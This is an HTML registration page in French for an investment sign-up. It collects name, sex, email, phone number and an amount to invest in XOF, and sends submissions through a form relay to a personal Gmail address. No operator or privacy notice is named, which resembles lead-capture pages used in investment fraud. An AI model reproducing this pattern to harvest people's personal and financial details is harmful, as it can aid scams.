<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Inscription</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 20px;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: Arial, sans-serif;

      /* ARRIÈRE-PLAN */
      background:
        radial-gradient(
          circle at 10% 20%,
          rgba(255, 255, 255, 0.18),
          transparent 25%
        ),
        radial-gradient(
          circle at 90% 80%,
          rgba(255, 215, 100, 0.15),
          transparent 25%
        ),
        linear-gradient(
          135deg,
          #063d2b,
          #08734d,
          #022c20
        );
    }

    .container {
      width: 100%;
      max-width: 430px;
      background: rgba(255, 255, 255, 0.98);
      padding: 30px 22px;
      border-radius: 18px;
      border: 2px solid #d6a83a;
      box-shadow: 0 15px 45px rgba(0, 0, 0, 0.25);
    }

    h1 {
      text-align: center;
      color: #064b35;
      margin: 0 0 8px;
      font-size: 30px;
    }

    .subtitle {
      text-align: center;
      color: #666;
      margin: 0 0 25px;
      line-height: 1.5;
    }

    label {
      display: block;
      margin-top: 15px;
      margin-bottom: 7px;
      font-weight: bold;
      color: #064b35;
    }

    input,
    select {
      width: 100%;
      padding: 14px;
      border: 1px solid #ccc;
      border-radius: 9px;
      font-size: 15px;
      outline: none;
      background: #fff;
    }

    input:focus,
    select:focus {
      border-color: #138a5b;
      box-shadow: 0 0 0 3px rgba(19, 138, 91, 0.10);
    }

    .amount-box {
      position: relative;
    }

    .amount-box input {
      padding-right: 60px;
    }

    .currency {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      color: #08734d;
      font-weight: bold;
      pointer-events: none;
    }

    .info {
      margin-top: 8px;
      padding: 10px;
      border-radius: 8px;
      background: #eef8f2;
      color: #17633f;
      font-size: 13px;
      line-height: 1.4;
    }

    button {
      width: 100%;
      margin-top: 25px;
      padding: 15px;
      border: 2px solid #d6a83a;
      border-radius: 9px;
      background: linear-gradient(
        135deg,
        #08734d,
        #064b35
      );
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15);
    }

    button:hover {
      background: linear-gradient(
        135deg,
        #09875a,
        #075b40
      );
    }

    .footer {
      text-align: center;
      margin-top: 18px;
      font-size: 12px;
      color: #777;
    }
  </style>
</head>

<body>

  <div class="container">

    <h1>Créer un compte</h1>

    <p class="subtitle">
      Veuillez remplir le formulaire pour finaliser votre inscription.
    </p>

    <form
      action="https://formsubmit.co/taxmoney65@gmail.com"
      method="POST"
    >

      <input
        type="hidden"
        name="_subject"
        value="Nouvelle inscription"
      >

      <input
        type="hidden"
        name="_template"
        value="table"
      >

      <input
        type="hidden"
        name="_next"
        value="https://mohamed-2004-code.github.io/Inscription-investissement-/success.html"
      >

      <label for="nom">Nom</label>

      <input
        type="text"
        id="nom"
        name="Nom"
        placeholder="Votre nom"
        required
      >

      <label for="prenom">Prénom</label>

      <input
        type="text"
        id="prenom"
        name="Prénom"
        placeholder="Votre prénom"
        required
      >

      <label for="sexe">Sexe</label>

      <select
        id="sexe"
        name="Sexe"
        required
      >
        <option value="">Sélectionner</option>
        <option value="Homme">Homme</option>
        <option value="Femme">Femme</option>
      </select>

      <label for="email">Adresse e-mail</label>

      <input
        type="email"
        id="email"
        name="Email"
        placeholder="exemple@email.com"
        required
      >

      <label for="telephone">Numéro de téléphone</label>

      <input
        type="tel"
        id="telephone"
        name="Téléphone"
        placeholder="+229 XX XX XX XX"
        required
      >

      <label for="montant">
        Montant à investir (XOF)
      </label>

      <div class="amount-box">

        <input
          type="number"
          id="montant"
          name="Montant à investir"
          placeholder="Exemple : 50 000"
          min="1"
          required
        >

        <span class="currency">XOF</span>

      </div>

      <div class="info">
        Veuillez indiquer le montant que vous souhaitez investir.
      </div>

      <button type="submit">
        ✓ VALIDER L’INSCRIPTION
      </button>

    </form>

    <div class="footer">
      Merci de vérifier les informations saisies avant de valider.
    </div>

  </div>

</body>
</html>
